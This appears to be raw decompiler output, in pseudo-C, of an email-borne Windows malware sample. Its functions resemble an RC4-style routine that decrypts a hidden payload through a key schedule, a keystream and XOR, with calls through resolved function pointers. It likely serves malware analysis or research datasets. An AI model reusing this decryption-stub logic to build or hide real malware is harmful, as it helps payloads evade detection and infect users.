// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0913/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401005(word32 eax, word32 ecx, word32 edx, word32 ebx, word32 ebp, word32 esi, word32 edi, selector fs)
{
	word32 edx_39 = edx + esi + esi + (fp + 0x00000010) + (fp + 0x00000010);
	fn004010CE(edx_39 + 0x7B60D48E, 0x00000000, ebx, ebp, edi, fs, dwLoc2C, 0x00000000, esi);
	fn004010CE(edx_39 + 0x7B60D48E, 0x00000000, ebx, ebp, edi, fs, ebp, dwArg14, dwArg20);
	return;
}

void fn004010CE(word32 eax, word32 ecx, word32 ebx, word32 ebp, word32 edi, selector fs, word32 dwArg00, word32 dwArg18, word32 dwArg24)
{
	word32 eax_24 = DPB(dwArg00, 0x0000, 0, 16);
	word32 ecx_30 = DPB(ecx, Mem0[eax_24 + 0x00000000:word16], 0, 16);
	word32 eax_40 = DPB(dwArg00, 0x0000, 0, 16);
	word32 ecx_61 = -(ecx_30 + 0x0000A5B2);
	word32 ebp_119 = ebp + 0x00000001;
	Mem126[fp - 0x0000002C:word32] = fp - 0x00000028;
	fn00401695(dwLoc30);
	Mem131[fp - 0x0000001C:word32] = fp - 0x00000028;
	Mem134[fp - 0x00000020:word32] = eax_40 + 0x00006C7C;
	Mem137[fp - 0x00000024:word32] = eax_40 + 0x00006C7C;
	Mem140[fp - 0x00000028:word32] = eax_40 + 0x00006C7C;
	Mem140[ebx + 0x00000018:word32]();
	Mem140[ebx + 0x0000001C:word32]();
	word16 si_157 = SEQ(fs, eax_40 + 0x00006C80)[(eax_40 + 0x00006C82) * 0x0008] + 0x0002;
	word32 esi_158 = DPB(0x00000002, si_157, 0, 16);
	Mem164[fp - 0x0000002C:word32] = eax_40 + 0x00006C82;
	Mem167[fp - 0x00000030:word32] = eax_40 + 0x00006C82;
	Mem167[ebx + 0x00000000:word32]();
	Mem170[fp + 0x00000008:word32] = ebx;
	Mem172[fp + 0x0000000C:word32] = esi_158 - 0x00000001;
	Mem175[fp - 0x00000034:word32] = ebx;
	word32 v18_177 = Mem175[fp - 0x00000034:word32] - 0x00000004;
	Mem178[fp - 0x00000034:word32] = v18_177;
	word32 edi_185 = Mem178[fp - 0x00000034:word32];
	Mem189[fp - 0x00000034:word32] = eax_40 + 0x00006C82;
	Mem192[fp - 0x00000038:word32] = ecx_61;
	Mem195[fp - 0x0000003C:word32] = fp - 0x0000003C;
	Mem198[fp - 0x00000040:word32] = 0x00000040;
	Mem201[fp - 0x00000044:word32] = Mem198[fp - 0x00000014:word32];
	Mem204[fp - 0x00000048:word32] = Mem201[fp - 0x00000020:word32];
	Mem210[fp - 0x00000018:word32] = 0x00000000;
	Mem212[fp - 0x0000004C:word32] = 0xFFFFFFFF;
	Mem212[edi_185 + 0x00000010:word32]();
	word32 eax_214 = eax_40 + 0x00006C82 + Mem212[fs:eax_40 + 0x00006CB1:word32];
	word32 v19_218 = Mem212[fp - 0x0000001C:word32] + Mem212[eax_214 + 0x00000003:word32];
	Mem219[fp - 0x0000001C:word32] = v19_218;
	Mem222[fp - 0x00000050:word32] = eax_214;
	Mem228[fp - 0x0000004C:word32] = Mem222[fp - 0x00000050:word32];
	Mem234[fp - 0x00000048:word32] = Mem228[fp - 0x0000004C:word32];
	word32 edi_237 = Mem234[fp - 0x00000044:word32];
	Mem240[fp - 0x00000044:word32] = Mem234[fp - 0x00000048:word32];
	word32 ebx_246 = Mem240[fp - 0x00000040:word32];
	word32 eax_242 = Mem240[fp - 0x00000044:word32];
	word16 bx_248 = (word16) ebx_246;
	word32 esi_250 = Mem240[fp - 0x0000003C:word32];
	Mem258[fp - 0x0000003C:word32] = eax_242 + 0x00000003;
	word32 eax_259 = Mem258[fp - 0x0000003C:word32];
	word32 ecx_261 = Mem258[eax_259 + 0x00000000:word32];
	Mem263[fp - 0x0000003C:word32] = eax_259;
	word32 v20_267 = Mem263[fp - 0x00000010:word32] ^ ecx_261;
	Mem268[fp - 0x00000010:word32] = v20_267;
	word32 eax_271 = Mem268[fp - 0x00000030:word32];
	word32 ecx_274 = Mem268[fp - 0x00000020:word32];
	Mem277[fp - 0x0000003C:word32] = eax_271;
	Mem283[fp - 0x00000144:word32] = Mem277[fp - 0x0000003C:word32];
	Mem287[fp - 0x00000140:word32] = Mem283[fp - 0x00000144:word32];
	word16 cx_275 = (word16) ecx_274;
	Mem288[fp - 0x0000013C:word32] = ecx_274;
	Mem290[fp - 0x00000144:word32] = edi_237;
	word32 esp_289 = fp - 0x00000144 + 0x0000000C;
	word32 eax_291 = 0x00000000;
	do
	{
		word32 esp_299 = esp_289 - 0x00000004;
		Mem300[esp_299 + 0x00000000:word32] = eax_291;
		word32 eax_301 = Mem300[esp_299 + 0x00000000:word32];
		Mem304[esp_289 + 0x00000000 + eax_291:byte] = (byte) eax_301;
		Mem307[esp_299 + 0x00000000:word32] = eax_301;
		Mem312[esp_299 + 0x00000000:word32] = Mem307[esp_299 + 0x00000000:word32] + 0x00000001;
		word32 eax_313 = Mem312[esp_299 + 0x00000000:word32];
		Mem318[esp_299 + 0x00000000:word32] = eax_313;
		eax_291 = Mem318[esp_299 + 0x00000000:word32];
		esp_289 = esp_299 + 0x00000004;
	} while (eax_313 <u 0x00000100);
	Mem325[esp_299 + 0x00000000:word32] = eax_291;
	word32 edi_328 = Mem325[esp_299 + 0x00000004:word32];
	Mem331[esp_299 + 0x00000004:word32] = Mem325[esp_299 + 0x00000000:word32];
	Mem336[esp_299 + 0x00000004:word32] = esp_299 + 0x00000140;
	word32 eax_338 = Mem336[esp_299 + 0x00000004:word32];
	word32 esp_341 = esp_299 + 0x00000008;
	if (Mem336[eax_338 + 0x00000000:byte] != 0x79)
	{
		edi_328 = Mem336[eax_338 - 0x00000004:word32];
		do
		{
			Mem336[edi_328 + 0x00000018:word32]();
			Mem559[esp_299 + 0x00000004:word32] = eax_338;
			word32 eax_561 = Mem559[esp_299 + 0x00000004:word32];
			Mem559[edi_328 + 0x00000010:word32]();
			Mem564[esp_299 + 0x00000004:word32] = eax_561;
			word32 eax_566 = Mem564[esp_299 + 0x00000004:word32];
			Mem564[edi_328 + 0x00000018:word32]();
			Mem569[esp_299 + 0x00000004:word32] = eax_566;
			word32 eax_571 = Mem569[esp_299 + 0x00000004:word32];
			Mem569[edi_328 + 0x00000018:word32]();
			Mem574[esp_299 + 0x00000004:word32] = eax_571;
			word32 eax_576 = Mem574[esp_299 + 0x00000004:word32];
			Mem574[edi_328 + 0x00000018:word32]();
			Mem579[esp_299 + 0x00000004:word32] = eax_576;
			word32 eax_581 = Mem579[esp_299 + 0x00000004:word32];
			Mem579[edi_328 + 0x00000018:word32]();
			Mem579[edi_328 + 0x00000018:word32]();
			Mem579[edi_328 + 0x00000010:word32]();
			Mem586[esp_299 + 0x00000004:word32] = eax_581;
			word32 eax_588 = Mem586[esp_299 + 0x00000004:word32];
			Mem598[esp_299 + 0x00000004:word32] = eax_588 + 0x00000001;
			word32 eax_600 = Mem598[esp_299 + 0x00000004:word32];
			word16 ax_603 = (word16) eax_600 - cx_275;
			Mem608[esp_299 + 0x00000004:word32] = DPB(eax_600, ax_603, 0, 16);
			word32 eax_610 = Mem608[esp_299 + 0x00000004:word32];
		} while (ax_603 <u 0x0000);
		Mem615[esp_299 + 0x00000004:word32] = eax_610;
		eax_338 = Mem615[esp_299 + 0x00000004:word32];
		esp_341 = esp_299 + 0x00000008;
	}
	word32 esp_367 = esp_341 - 0x00000004;
	Mem368[esp_367 + 0x00000000:word32] = eax_338;
	word32 eax_369 = Mem368[esp_367 + 0x00000000:word32];
	Mem372[esp_367 + 0x00000000:word32] = ebp_119;
	Mem374[esp_367 - 0x00000004:word32] = eax_369;
	word32 eax_375 = Mem374[esp_367 - 0x00000004:word32];
	Mem378[esp_367 - 0x00000004:word32] = esi_250;
	Mem380[esp_367 - 0x00000008:word32] = eax_375;
	Mem385[esp_367 - 0x00000008:word32] = edi_328;
	word32 edi_387 = Mem385[esp_367 + 0x0000011C:word32];
	Mem396[esp_367 - 0x0000000C:word32] = 0x00000000;
	word32 esi_393 = 0x00000000;
	word32 eax_398 = Mem396[esp_367 - 0x0000000C:word32];
	word32 ebp_402 = 0x00000000;
	Mem406[esp_367 - 0x0000000C:word32] = ebx_246;
	word32 esp_405 = esp_367 - 0x0000000C;
	do
	{
		word32 ebx_418 = (word32) Mem406[esp_405 + 0x00000018 + ebp_402:byte];
		word32 esp_419 = esp_405 - 0x00000004;
		Mem420[esp_419 + 0x00000000:word32] = eax_398;
		word32 edx_423 = Mem420[esp_419 + 0x00000018:word32];
		Mem425[esp_419 + 0x00000000:word32] = Mem420[esp_419 + 0x00000000:word32];
		word32 eax_426 = Mem425[esp_419 + 0x00000000:word32];
		word32 edx_428 = (word32) Mem425[edx_423 + eax_426:byte];
		Mem432[esp_419 + 0x00000000:word32] = eax_426;
		word32 eax_434 = Mem432[esp_419 + 0x00000000:word32];
		word32 ecx_440 = ebx_418 + esi_393;
		word32 edx_443 = edx_428 + ecx_440;
		word32 edx_448 = DPB(edx_443, 0x00, 8, 8);
		Mem453[esp_419 + 0x00000000:word32] = eax_434 + 0x00000001;
		Mem459[esp_419 + 0x00000000:word32] = Mem453[esp_419 + 0x00000000:word32];
		word32 eax_460 = Mem459[esp_419 + 0x00000000:word32];
		Mem465[esp_419 + 0x00000000:word32] = eax_460;
		esi_393 = edx_448;
		word32 eax_467 = Mem465[esp_419 + 0x00000000:word32];
		word32 esp_470 = esp_419 + 0x00000004 + 0x00000018;
		if (eax_460 >=u edi_387)
		{
			Mem544[esp_419 + 0x00000000:word32] = eax_467;
			Mem551[esp_419 + 0x00000000:word32] = 0x00000000;
			eax_467 = Mem551[esp_419 + 0x00000000:word32];
			esp_470 = esp_419 + 0x00000004;
		}
		byte dl_474 = Mem465[esp_470 + 0x00000000 + edx_448:byte];
		word32 esp_475 = esp_470 - 0x00000004;
		Mem476[esp_475 + 0x00000000:word32] = eax_467;
		word32 eax_477 = Mem476[esp_475 + 0x00000000:word32];
		Mem479[esp_475 + 0x0000001C + ebp_402:byte] = dl_474;
		Mem481[esp_475 + 0x00000000:word32] = eax_477;
		word32 eax_483 = Mem481[esp_475 + 0x00000000:word32];
		ebp_402 = ebp_402 + 0x00000001;
		word32 edx_489 = esp_475 + 0x0000001C + edx_448;
		word32 edx_492 = edx_489 - eax_483;
		bx_248 = DPB(bx_248, Mem481[eax_483 + 0x00000001 + edx_492:byte], 8, 8);
		Mem499[esp_475 + 0x00000000:word32] = eax_483;
		word32 eax_500 = Mem499[esp_475 + 0x00000000:word32];
		Mem502[eax_500 + edx_492:word16] = bx_248;
		Mem504[esp_475 + 0x00000000:word32] = eax_500;
		Mem510[esp_475 + 0x00000000:word32] = Mem504[esp_475 + 0x00000000:word32];
		Mem517[esp_475 + 0x00000000:word32] = Mem510[esp_475 + 0x00000000:word32];
		Mem522[esp_475 + 0x00000000:word32] = Mem517[esp_475 + 0x00000000:word32];
		eax_398 = Mem522[esp_475 + 0x00000000:word32];
		esp_405 = esp_475 + 0x00000004;
	} while (SLICE(ebp_402, byte, 8) != 0x01);
	word32 ecx_536;
	word32 ebx_537;
	word32 ebp_538;
	word32 edi_539;
	fn00401723(eax_40 + 0x00006C7C, eax_40 + 0x00006030, dwArg04, dwArg08, dwArg0C, dwArg0114, dwArg0118, dwArg0128, dwArg013C, dwArg0140, out ecx_536, out ebx_537, out ebp_538, out edi_539);
	return;
}

void fn00401695(word32 dwArg00)
{
fn00401695_entry:
	goto l00401695
l00401165:
	word32 eax_59 = DPB(eax_20, ax_56 + 0xA5B5, 0, 16)
	goto l004016D8
l00401695:
	word32 eax_20 = dwArg00
l004016AC:
	word16 ax_56 = Mem0[DPB(eax_20, 0x0000, 0, 16):word16]
	goto l00401165
l004016D8:
	branch ax_56 == 0xA5B3 l00401706
l004016E7:
	eax_20 = eax_59 - 0x00010000
	goto l004016AC
l00401706:
fn00401695_exit:
}

word32 fn00401723(word32 dwArg00, word32 dwArg04, word32 dwArg08, word32 dwArg0C, word32 dwArg10, word32 dwArg0118, word32 dwArg011C, word32 dwArg012C, word32 dwArg0140, word32 dwArg0144, ptr32 ecxOut, ptr32 ebxOut, ptr32 ebpOut, ptr32 ediOut)
{
	*ecxOut = ecx;
	word32 esi_129 = 0x00000000;
	word32 ebp_130 = dwArg012C;
	word32 edi_128 = dwArg10;
	word32 edx_218 = dwArg00;
	if (true)
	{
		Mem115[fp + 0x00000000:word32] = 0x00000000;
		word32 eax_117 = 0x00000000;
		do
		{
			word32 eax_139 = DPB(eax_117 + 0x00000001, 0x00, 8, 8);
			byte cl_144 = Mem115[fp + 0x00000018 + eax_139:byte];
			word32 ebx_163 = (word32) cl_144;
			word32 ebx_164 = ebx_163 + esi_129;
			word32 ebx_169 = DPB(ebx_164, 0x00, 8, 8);
			byte dh_177 = Mem115[fp + 0x00000004 + (ebx_169 + 0x00000014):byte];
			Mem182[fp + 0x00000018 + eax_139:byte] = dh_177;
			Mem198[fp + 0x00000004 + (ebx_169 + 0x00000014):byte] = cl_144;
			word32 edx_212 = (word32) dh_177;
			byte dl_214 = (byte) edx_212;
			word32 edx_216 = DPB(edx_212, dl_214 + cl_144, 0, 8);
			edx_218 = edx_216 + 0x00000014;
			word32 ecx_222 = Mem198[fp + 0x00000004 + (edx_216 + 0x00000014):word32];
			Mem241[edi_128 - 0x00000001:word16] = Mem198[edi_128 - 0x00000001:word16] ^ (word16) (ecx_222 << 0x00000008);
			word32 ecx_225;
			*ecxOut = ecx_222 << 0x00000008;
			esi_129 = ebx_169;
			edi_128 = edi_128 + 0x00000001;
			ebp_130 = ebp_130 - 0x00000001;
			eax_117 = eax_139;
		} while (ebp_130 != 0x00000000);
	}
	word32 edi_68;
	*ediOut = dwArg04;
	word32 ebp_74;
	*ebpOut = dwArg0C;
	word32 ebx_100;
	*ebxOut = edx_218;
	return dwArg011C;
}

